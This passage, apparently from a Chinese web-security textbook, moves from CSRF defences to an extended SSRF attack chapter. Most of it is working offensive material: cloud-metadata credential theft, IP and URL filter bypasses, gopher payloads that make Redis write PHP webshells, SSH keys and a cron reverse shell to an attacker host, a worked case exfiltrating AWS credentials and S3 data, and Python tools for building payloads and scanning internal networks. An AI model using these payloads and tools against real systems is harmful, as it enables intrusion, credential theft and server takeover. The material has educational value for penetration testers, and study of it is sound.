        if (referer == null || referer.isEmpty()) {
            return false;
        }
        
        try {
            URI uri = new URI(referer);
            String host = uri.getHost();
            
            return ALLOWED_DOMAINS.stream()
                .anyMatch(domain -> 
                    host.equals(domain) || 
                    host.endsWith("." + domain)
                );
        } catch (Exception e) {
            return false;
        }
    }
}
```

### 8.8.4 验证码防护

**关键操作验证码**

```php
<?php
// 生成验证码
session_start();
$code = substr(md5(mt_rand()), 0, 6);
$_SESSION['captcha'] = $code;

// 验证验证码
function validateCaptcha($input) {
    return isset($_SESSION['captcha']) && 
           strtolower($_SESSION['captcha']) === strtolower($input);
}

// 关键操作验证
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!validateCaptcha($_POST['captcha'] ?? '')) {
        die('验证码错误');
    }
    // 执行操作
}
?>
```

**二次验证**

```text
关键操作需要二次验证：
1. 修改密码：输入原密码
2. 转账操作：输入支付密码
3. 绑定手机：短信验证码
4. 修改邮箱：邮件验证码
5. 删除账户：确认密码
6. 提现操作：支付密码
```

### 8.8.5 防护最佳实践

**多层防护策略**

```text
第一层：SameSite Cookie属性
- 设置Strict或Lax模式
- 配合Secure和HttpOnly

第二层：CSRF Token验证
- 所有POST请求必须包含Token
- Token与Session绑定
- Token一次性使用

第三层：Referer验证
- 验证请求来源域名
- 拒绝空Referer

第四层：验证码/二次验证
- 关键操作添加验证码
- 敏感操作需要二次验证
```

**安全配置清单**

```text
□ 所有Cookie设置SameSite属性
□ 敏感操作使用POST请求
□ 实现CSRF Token机制
□ 验证Referer头
□ 关键操作添加验证码
□ 关键操作需要二次验证
□ 避免GET请求执行写操作
□ Token一次性使用
□ Token设置过期时间
□ Token与Session绑定
□ 记录CSRF攻击尝试日志
□ 实现CSRF攻击告警
```

## 8.9 SSRF漏洞概述

### 8.9.1 什么是SSRF

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种安全漏洞，攻击者利用服务器发起请求的功能，诱使服务器向内部资源或外部系统发送请求，从而获取敏感信息或攻击内部系统。

**通俗理解**

想象服务器是一个可以帮你访问网页的中间人。正常情况下，你请求服务器访问某个网页，服务器返回结果。但如果存在SSRF漏洞，你可以让服务器访问它本不该访问的资源，比如内网服务器、本地文件、云服务元数据等。

**SSRF与CSRF的区别**

| 特征 | SSRF | CSRF |
|-----|------|------|
| 攻击者 | 服务器 | 用户浏览器 |
| 请求发起方 | 服务器 | 用户浏览器 |
| 攻击目标 | 内网资源 | 用户操作 |
| 利用条件 | 服务器请求功能 | 用户已登录 |
| 危害程度 | 高-严重 | 中-高 |

### 8.9.2 SSRF的危害

SSRF可能导致以下严重后果：

1. **内网探测**：探测内网存活主机、开放端口
2. **敏感信息泄露**：获取云服务元数据、配置信息
3. **内网服务攻击**：攻击内网Web服务、数据库
4. **文件读取**：读取本地敏感文件
5. **绕过访问控制**：绕过IP白名单、防火墙
6. **云服务攻击**：获取AWS/Azure/GCP凭证
7. **RCE（远程代码执行）**：通过内网服务漏洞获取服务器权限

**真实案例**

2019年，Capital One数据泄露事件中，攻击者利用SSRF漏洞访问AWS EC2元数据服务，获取IAM临时凭证，最终导致超过1亿用户数据泄露。

### 8.9.3 SSRF攻击原理

**攻击流程图**

```
┌─────────┐      ┌─────────┐      ┌─────────┐
│ 攻击者  │─────▶│ 目标服务器│─────▶│ 内网资源 │
└─────────┘      └─────────┘      └─────────┘
                      │
                      ▼
                 ┌─────────┐
                 │ 云服务  │
                 └─────────┘
```

**常见触发点**

```text
1. 图片加载：从URL加载图片
2. 文件获取：从URL获取文件内容
3. API调用：调用外部API接口
4. PDF生成：从URL生成PDF
5. 网页抓取：抓取网页内容
6. 邮件发送：发送邮件时获取内容
7. 视频转码：从URL获取视频
8. 网页预览：网页截图预览
9. URL缩短：URL缩短服务
10. 代理服务：HTTP代理功能
```

**示例代码**

```php
<?php
// 存在SSRF漏洞的代码
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
?>
```

**正常请求**

```
http://example.com/fetch?url=http://api.example.com/data
```

**SSRF攻击**

```
# 访问内网服务
http://example.com/fetch?url=http://192.168.1.1/admin

# 读取本地文件
http://example.com/fetch?url=file:///etc/passwd

# 访问云元数据
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

## 8.10 SSRF漏洞类型详解

### 8.10.1 基础SSRF类型

**带外SSRF（Out-of-band SSRF）**

```text
原理：攻击者无法直接看到响应，但可以通过带外通道获取信息
方法：使用DNSLog、HTTP回调等方式检测

检测步骤：
1. 发送请求到攻击者服务器
2. 观察服务器是否收到请求
3. 如果收到，存在SSRF漏洞

示例：
http://example.com/fetch?url=http://xxx.dnslog.cn
```

**带内SSRF（In-band SSRF）**

```text
原理：攻击者可以直接看到响应内容
方法：直接访问内网资源，查看响应

检测步骤：
1. 访问内网IP
2. 观察响应内容
3. 如果返回内网信息，存在SSRF漏洞

示例：
http://example.com/fetch?url=http://127.0.0.1
```

**盲SSRF（Blind SSRF）**

```text
原理：攻击者无法看到响应，但可以触发操作
方法：利用内网服务的功能执行操作

检测步骤：
1. 发送请求到内网服务
2. 观察是否有副作用
3. 如果有，存在盲SSRF漏洞

示例：
http://example.com/fetch?url=http://192.168.1.100/api/delete-user?id=1
```

### 8.10.2 DNS Rebinding

**漏洞原理**

DNS重绑定攻击是指攻击者控制DNS服务器，在短时间内将同一域名解析到不同的IP地址，从而绕过IP白名单限制。

**攻击流程**

```
时间线：
T0: 攻击者注册域名 attacker.com
T1: 设置DNS服务器，第一次解析返回外网IP（通过白名单验证）
T2: 目标服务器验证域名，解析到外网IP
T3: DNS服务器第二次解析返回内网IP（实际访问）
T4: 目标服务器使用缓存的域名，访问内网IP
```

**攻击方式**

```text
步骤：
1. 注册域名 attacker.com
2. 搭建恶意DNS服务器
3. 设置域名解析规则：
   - 第一次解析：返回攻击者外网IP（1.2.3.4）
   - 第二次解析：返回内网IP（192.168.1.1）
4. 发送请求：http://example.com/fetch?url=http://attacker.com
5. 目标服务器先验证域名（解析到1.2.3.4，通过白名单）
6. 实际访问时，域名解析到192.168.1.1
7. 成功访问内网资源
```

**防护方法**

```text
1. 验证DNS解析结果，禁止内网IP
2. 使用DNS缓存固定技术
3. 对同一域名的多次解析进行验证
4. 使用IP而非域名进行白名单验证
```

### 8.10.3 SSRF到RCE

**漏洞原理**

通过SSRF漏洞访问内网服务，利用内网服务的漏洞实现远程代码执行。

**常见内网服务漏洞**

```text
1. Redis未授权访问 → 写入WebShell/SSH公钥/定时任务
2. MongoDB未授权访问 → 数据泄露/数据库操作
3. MySQL未授权访问 → 数据泄露/文件写入
4. Elasticsearch未授权访问 → 数据泄露/RCE
5. Jenkins未授权访问 → RCE
6. Tomcat默认密码 → RCE
7. JBoss未授权访问 → RCE
```

**攻击流程**

```
步骤：
1. 利用SSRF探测内网存活主机
2. 发现内网服务（如Redis）
3. 利用SSRF访问Redis服务
4. 执行Redis命令写入WebShell
5. 通过WebShell获取服务器权限
```

**Redis攻击示例**

```text
# 使用dict协议
dict://127.0.0.1:6379/info

# 使用gopher协议写入WebShell
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a<?php eval($_POST['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 8.10.4 云元数据攻击

**AWS EC2元数据**

```text
# 获取IAM角色
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}

# 获取用户数据
http://169.254.169.254/latest/user-data/

# 获取实例信息
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/instance-id
```

**Google Cloud元数据**

```text
# 需要添加Metadata-Flavor头
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

**Azure元数据**

```text
# 需要添加Metadata头
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text
```

**阿里云元数据**

```text
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/network/interfaces/macs/{mac}/vpc-ipv4s
```

### 8.10.5 Redis攻击

**Redis未授权访问**

```text
# 使用dict协议
dict://127.0.0.1:6379/info

# 使用gopher协议
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# 使用HTTP协议
http://127.0.0.1:6379/
```

**写入WebShell**

```bash
# Redis命令
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE

# Gopher Payload
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**SSH公钥写入**

```bash
# Redis命令
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET ssh_key "ssh-rsa AAAA... attacker@kali"
SAVE

# Gopher Payload
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$100%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$12%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$14%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**定时任务反弹Shell**

```bash
# Redis命令
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1\n\n"
SAVE
```

## 8.11 SSRF漏洞挖掘实战过程

### 8.11.1 完整挖掘流程

**第一步：漏洞点识别**

```text
识别步骤：
1. 分析网站功能，寻找可能存在SSRF的功能点
2. 关注以下参数：url, link, src, href, source, target, domain, host
3. 关注以下功能：图片加载、文件获取、PDF生成、网页抓取、URL缩短
4. 记录所有可疑的URL参数和功能点
```

**第二步：漏洞检测**

```text
检测步骤：
1. 使用基础Payload测试
2. 使用DNSLog检测带外SSRF
3. 使用自己的服务器检测带内SSRF
4. 测试各种协议支持（http, https, file, dict, gopher等）
5. 记录检测结果
```

**第三步：内网探测**

```text
探测步骤：
1. 使用SSRF漏洞探测内网存活主机
2. 扫描常见端口（21, 22, 80, 443, 3306, 6379, 8080等）
3. 识别内网服务类型
4. 记录发现的内网资源
```

**第四步：漏洞利用**

```text
利用步骤：
1. 根据发现的内网服务选择攻击方法
2. 尝试访问云元数据服务
3. 尝试攻击Redis、MySQL等服务
4. 获取敏感信息或服务器权限
```

### 8.11.2 实战案例：某云平台SSRF挖掘

**漏洞点识别**

```text
目标网站：cloud.example.com

可疑功能点：
1. 图片加载：/api/image/load?url=http://example.com/image.jpg
2. PDF生成：/api/pdf/generate?url=http://example.com/document.html
3. 网页预览：/api/preview?url=http://example.com/page.html
```

**漏洞检测**

```http
# 基础测试
GET /api/image/load?url=http://127.0.0.1 HTTP/1.1
Host: cloud.example.com

# 响应：返回了本地页面内容，存在SSRF
```

```http
# DNSLog测试
GET /api/image/load?url=http://xxx.dnslog.cn HTTP/1.1
Host: cloud.example.com

# 响应：DNSLog收到请求，确认存在SSRF
```

**内网探测**

```python
import requests
import urllib.parse

def ssrf_port_scan(base_url, param):
    """SSRF端口扫描"""
    ports = [21, 22, 25, 80, 443, 3306, 6379, 8080, 8443, 27017]
    
    for port in ports:
        url = f"http://127.0.0.1:{port}"
        target = f"{base_url}?{param}={urllib.parse.quote(url)}"
        
        try:
            response = requests.get(target, timeout=5)
            if response.status_code != 0:
                print(f"[+] 端口 {port} 开放")
                print(f"    响应长度: {len(response.text)}")
                if len(response.text) > 0:
                    print(f"    响应内容: {response.text[:200]}")
        except:
            pass

ssrf_port_scan('http://cloud.example.com/api/image/load', 'url')
```

**漏洞利用**

```http
# 获取AWS元数据
GET /api/image/load?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: cloud.example.com

# 响应：返回IAM角色列表
ec2-admin-role
```

```http
# 获取临时凭证
GET /api/image/load?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role HTTP/1.1
Host: cloud.example.com

# 响应：返回IAM临时凭证
{
    "Code": "Success",
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalrX...",
    "Token": "IQoJb3JpZ...",
    "Expiration": "2024-01-01T12:00:00Z"
}
```

**利用凭证**

```bash
# 配置AWS CLI
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrX...
aws configure set aws_session_token IQoJb3JpZ...

# 列出S3存储桶
aws s3 ls

# 下载敏感数据
aws s3 cp s3://company-secrets/ ./ --recursive
```

## 8.12 SSRF绕过技巧

### 8.12.1 IP地址绕过

**技巧1：不同进制表示**

```text
# 十进制
http://2130706433  # 127.0.0.1

# 十六进制
http://0x7f000001  # 127.0.0.1

# 八进制
http://0177.0.0.1  # 127.0.0.1

# 组合进制
http://0x7f.0.0.1
http://127.0x0.0x1
```

**技巧2：使用@符号**

```text
http://attacker.com@127.0.0.1
http://user:pass@127.0.0.1
http://anything@127.0.0.1:8080
```

**技巧3：使用短链接**

```text
http://t.cn/xxx
http://bit.ly/xxx
http://goo.gl/xxx
```

**技巧4：使用DNS解析**

```text
http://localtest.me  # 解析到127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://127.0.0.1.xip.io
```

**技巧5：使用IPv6**

```text
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

**技巧6：使用句号**

```text
http://127。0。0。1  # 全角句号
http://127.0.0.1。  # 末尾全角句号
http://127。0。0。1。
```

**技巧7：使用加号**

```text
http://127.0.0.1+attacker.com
http://127.0.0.1+example.com@attacker.com
```

### 8.12.2 协议绕过

**技巧8：大小写混合**

```text
HtTp://127.0.0.1
Http://127.0.0.1
HTTP://127.0.0.1
hTtPs://127.0.0.1
```

**技巧9：添加空格**

```text
http:// 127.0.0.1
http://127.0.0.1 
http:// 127.0.0.1:8080
```

**技巧10：使用替代协议**

```text
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
file:///etc/passwd
ftp://127.0.0.1/
smb://127.0.0.1/
ldap://127.0.0.1/
```

**技巧11：省略协议**

```text
//127.0.0.1
//localhost
//192.168.1.1
```

**技巧12：URL编码绕过**

```text
http://%31%32%37%2E%30%2E%30%2E%31  // 127.0.0.1
http://127.0.0.1%2F
http://127.0.0.1%2E%61%74%74%61%63%6B%65%72%2E%63%6F%6D
```

**技巧13：双重编码绕过**

```text
http://%2531%2532%2537%252E%2530%252E%2530%252E%2531
http://127.0.0.1%252F
```

**技巧14：使用@符号组合**

```text
http://user@127.0.0.1
http://user:pass@127.0.0.1
http://www.example.com@127.0.0.1
http://www.example.com:80@127.0.0.1:8080
```

**技巧15：使用反斜杠**

```text
http:\\127.0.0.1
http:\\\\127.0.0.1
http://127.0.0.1\/
```

**技巧16：使用端口号混淆**

```text
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:080/  // 八进制端口
http://127.0.0.1:0x50/  // 十六进制端口
```

**技巧17：使用注释符**

```text
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://127.0.0.1/%23@attacker.com
```

### 8.12.3 URL解析绕过

**技巧18：多余的斜杠**

```text
http://127.0.0.1//
http://127.0.0.1///
http://127.0.0.1/path//to/resource
```

**技巧19：主机名后加端口**

```text
http://127.0.0.1:80
http://127.0.0.1:80/
http://127.0.0.1:/
```

**技巧20：使用点号组合**

```text
http://127.0.0.1./
http://127.0.0.1.../
http://127..0..0..1/
```

## 8.13 SSRF高级利用

### 8.13.1 内网扫描

**内网存活主机探测**

```python
import requests
import urllib.parse

def ssrf_internal_scan(base_url, param):
    """SSRF内网扫描"""
    networks = [
        '10.0.0.',
        '172.16.0.',
        '192.168.1.',
        '192.168.0.'
    ]
    
    for network in networks:
        print(f"[*] 扫描网段: {network}")
        
        for i in range(1, 255):
            ip = network + str(i)
            url = f"http://{ip}"
            target = f"{base_url}?{param}={urllib.parse.quote(url)}"
            
            try:
                response = requests.get(target, timeout=3)
                if response.status_code == 200 or len(response.text) > 0:
                    print(f"[+] 发现存活主机: {ip}")
                    print(f"    响应长度: {len(response.text)}")
                    
                    if 'Apache' in response.text:
                        print(f"    服务: Apache")
                    elif 'nginx' in response.text:
                        print(f"    服务: Nginx")
                    elif 'Tomcat' in response.text:
                        print(f"    服务: Tomcat")
                    elif 'Redis' in response.text:
                        print(f"    服务: Redis")
                        
            except Exception as e:
                pass
```

**端口扫描**

```python
def ssrf_port_scan(base_url, param, target_ip):
    """SSRF端口扫描"""
    common_ports = [
        21, 22, 25, 53, 80, 110, 143, 443, 445, 512, 513, 514,
        1080, 1521, 2049, 3306, 3389, 5432, 6379, 7001, 8000, 8080,
        8443, 9200, 11211, 27017
    ]
    
    print(f"[*] 扫描主机: {target_ip}")
    
    for port in common_ports:
        url = f"http://{target_ip}:{port}"
        target = f"{base_url}?{param}={urllib.parse.quote(url)}"
        
        try:
            response = requests.get(target, timeout=3)
            print(f"[+] 端口 {port} 开放")
            
            try:
                banner_url = f"http://{target_ip}:{port}/"
                banner_target = f"{base_url}?{param}={urllib.parse.quote(banner_url)}"
                banner_response = requests.get(banner_target, timeout=3)
                
                if len(banner_response.text) > 0:
                    print(f"    Banner: {banner_response.text[:100]}")
            except:
                pass
                
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.Timeout:
            print(f"[!] 端口 {port} 超时（可能被过滤）")
```

### 8.13.2 Redis未授权访问攻击

**Redis信息收集**

```http
GET /api/fetch?url=dict://127.0.0.1:6379/info HTTP/1.1
Host: target.com

GET /api/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a HTTP/1.1
Host: target.com
```

**写入WebShell**

```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a<?php eval($_POST['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**URL编码后的Payload**

```text
http://target.com/api/fetch?url=gopher://127.0.0.1:6379/_%2A1%250d%250a%248%250d%250aflushall%250d%250a%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2434%250d%250a%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2413%250d%250a%2Fvar%2Fwww%2Fhtml%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%249%250d%250ashell.php%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a
```

**SSH公钥写入**

```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$200%0d%0a%0a%0assh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQC...%20attacker%40kali%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$12%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$14%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 8.13.3 MongoDB攻击

**MongoDB未授权访问**

```http
GET /api/fetch?url=http://127.0.0.1:27017/ HTTP/1.1
Host: target.com

GET /api/fetch?url=gopher://127.0.0.1:27017/_%7B%22listDatabases%22%3A1%7D HTTP/1.1
Host: target.com
```

### 8.13.4 MySQL攻击

**MySQL未授权访问**

```http
GET /api/fetch?url=dict://127.0.0.1:3306/info HTTP/1.1
Host: target.com

GET /api/fetch?url=gopher://127.0.0.1:3306/_%00%00%00%01%85%A2%00%00%00%01%00%00%00%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00 HTTP/1.1
Host: target.com
```

### 8.13.5 云实例攻击

**AWS EC2攻击**

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/
```

**Google Cloud攻击**

```text
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

**Azure攻击**

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Metadata: true
```

**阿里云攻击**

```text
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
```

## 8.14 SSRF利用工具开发

### 8.14.1 SSRF扫描器开发

```python
import requests
import urllib.parse
import concurrent.futures
import argparse
import json

class SSRFScanner:
    
    def __init__(self, timeout=5, threads=10):
        self.timeout = timeout
        self.threads = threads
        self.results = []
        
        self.payloads = [
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://localhost',
            'http://0.0.0.0',
            'http://2130706433',
            'http://0x7f000001',
            'http://0177.0.0.1',
            'http://[::1]',
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://100.100.100.200/latest/meta-data/',
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/self/environ',
            'dict://127.0.0.1:6379/info',
            'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a',
            'http://xxx.dnslog.cn',
            'http://xxx.ceye.io',
        ]
    
    def test_payload(self, url, param, payload):
        try:
            encoded_payload = urllib.parse.quote(payload, safe='')
            test_url = url.replace(f'{param}=xxx', f'{param}={encoded_payload}')
            response = requests.get(test_url, timeout=self.timeout)
            
            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_sample': response.text[:500]
            }
            
            signs = ['root:', 'meta-data', 'REDIS', 'MongoDB', 'MySQL']
            for sign in signs:
                if sign in response.text:
                    result['vulnerable'] = True
                    result['indicator'] = sign
                    break
            
            if 'vulnerable' not in result:
                if len(response.text) > 0 and response.status_code != 404:
                    result['vulnerable'] = 'possible'
                else:
                    result['vulnerable'] = False
            
            self.results.append(result)
            
            if result['vulnerable']:
                print(f"[!] 发现SSRF漏洞: {payload}")
                print(f"    响应长度: {len(response.text)}")
                print(f"    响应样本: {response.text[:200]}")
                
        except Exception as e:
            if isinstance(e, requests.exceptions.Timeout):
                result = {
                    'payload': payload,
                    'vulnerable': 'timeout',
                    'error': '请求超时'
                }
                self.results.append(result)
                print(f"[?] 请求超时: {payload}")
            pass
    
    def scan(self, url, param):
        print(f"[*] 开始扫描: {url}")
        print(f"[*] 参数: {param}")
        print(f"[*] 测试Payload数量: {len(self.payloads)}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self.test_payload, url, param, payload)
                for payload in self.payloads
            ]
            
            for future in concurrent.futures.as_completed(futures):
                future.result()
        
        return self.results
    
    def generate_report(self, filename='ssrf_report.json'):
        report = {
            'total_payloads': len(self.payloads),
            'vulnerable_payloads': [r for r in self.results if r.get('vulnerable')],
            'results': self.results
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"[*] 报告已保存: {filename}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSRF漏洞扫描器')
    parser.add_argument('-u', '--url', required=True, help='目标URL，包含xxx占位符')
    parser.add_argument('-p', '--param', required=True, help='待测试参数名')
    parser.add_argument('-t', '--threads', type=int, default=10, help='线程数')
    parser.add_argument('-o', '--output', default='ssrf_report.json', help='输出报告文件名')
    
    args = parser.parse_args()
    
    scanner = SSRFScanner(threads=args.threads)
    scanner.scan(args.url, args.param)
    scanner.generate_report(args.output)
```

### 8.14.2 Gopher协议构造工具

```python
import urllib.parse

class GopherBuilder:
    
    @staticmethod
    def redis_command(cmd):
        parts = cmd.split(' ')
        gopher_payload = f"*{len(parts)}\r\n"
        for part in parts:
            gopher_payload += f"${len(part)}\r\n{part}\r\n"
        encoded = urllib.parse.quote(gopher_payload, safe='')
        return f"gopher://127.0.0.1:6379/_{encoded}"
    
    @staticmethod
    def redis_write_shell(shell_content, output_path):
        commands = [
            'flushall',
            f'set 1 "{shell_content}"',
            f'config set dir {output_path}',
            f'config set dbfilename shell.php',
            'save'
        ]
        
        gopher_payload = ""
        for cmd in commands:
            parts = cmd.split(' ')
            gopher_payload += f"*{len(parts)}\r\n"
            for part in parts:
                gopher_payload += f"${len(part)}\r\n{part}\r\n"
        
        encoded = urllib.parse.quote(gopher_payload, safe='')
        return f"gopher://127.0.0.1:6379/_{encoded}"
    
    @staticmethod
    def redis_write_ssh_key(ssh_key):
        commands = [
            'flushall',
            f'set 1 "{ssh_key}"',
            'config set dir /root/.ssh',
            'config set dbfilename authorized_keys',
            'save'
        ]
        
        gopher_payload = ""
        for cmd in commands:
            parts = cmd.split(' ')
            gopher_payload += f"*{len(parts)}\r\n"
            for part in parts:
                gopher_payload += f"${len(part)}\r\n{part}\r\n"
        
        encoded = urllib.parse.quote(gopher_payload, safe='')
        return f"gopher://127.0.0.1:6379/_{encoded}"

if __name__ == '__main__':
    builder = GopherBuilder()
    
    info_payload = builder.redis_command('info')
    print(f"Redis info命令: {info_payload}")
    
    shell_payload = builder.redis_write_shell(
        '<?php eval($_POST["cmd"]); ?>',
        '/var/www/html'
    )
    print(f"写入WebShell: {shell_payload[:100]}...")
    
    ssh_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali'
    ssh_payload = builder.redis_write_ssh_key(ssh_key)
    print(f"写入SSH公钥: {ssh_payload[:100]}...")
```

### 8.14.3 内网扫描工具

```python
import requests
import urllib.parse
import concurrent.futures
import json

class InternalScanner:
    
    def __init__(self, base_url, param, timeout=3):
        self.base_url = base_url
        self.param = param
        self.timeout = timeout
        self.results = {}
    
    def scan_host(self, ip):
        try:
            url = f"http://{ip}"
            target = f"{self.base_url}?{self.param}={urllib.parse.quote(url)}"
            
            response = requests.get(target, timeout=self.timeout)
            
            if response.status_code == 200 or len(response.text) > 0:
                return {
                    'ip': ip,
                    'status': 'alive',
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'banner': response.text[:200]
                }
        except:
            pass
        
        return None
    
    def scan_network(self, network):
        print(f"[*] 扫描网段: {network}")
        
        hosts = [f"{network}{i}" for i in range(1, 255)]
        alive_hosts = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(self.scan_host, hosts)
            
            for result in results:
                if result:
                    alive_hosts.append(result)
                    print(f"[+] 发现存活主机: {result['ip']}")
                    if result.get('banner'):
                        print(f"    Banner: {result['banner'][:100]}")
        
        self.results[network] = alive_hosts
        return alive_hosts
    
    def scan_port(self, ip, port):
        try:
            url = f"http://{ip}:{port}"
            target = f"{self.base_url}?{self.param}={urllib.parse.quote(url)}"
            
            response = requests.get(target, timeout=self.timeout)
            
            if response.status_code == 200 or len(response.text) > 0:
                return {
                    'port': port,
                    'status': 'open',
                    'response_length': len(response.text),
                    'banner': response.text[:100]
                }
        except requests.exceptions.Timeout:
            return {
                'port': port,
                'status': 'filtered',
                'response_length': 0
            }
        except:
            pass
        
        return None
    
    def scan_ports(self, ip, ports=None):
        if ports is None:
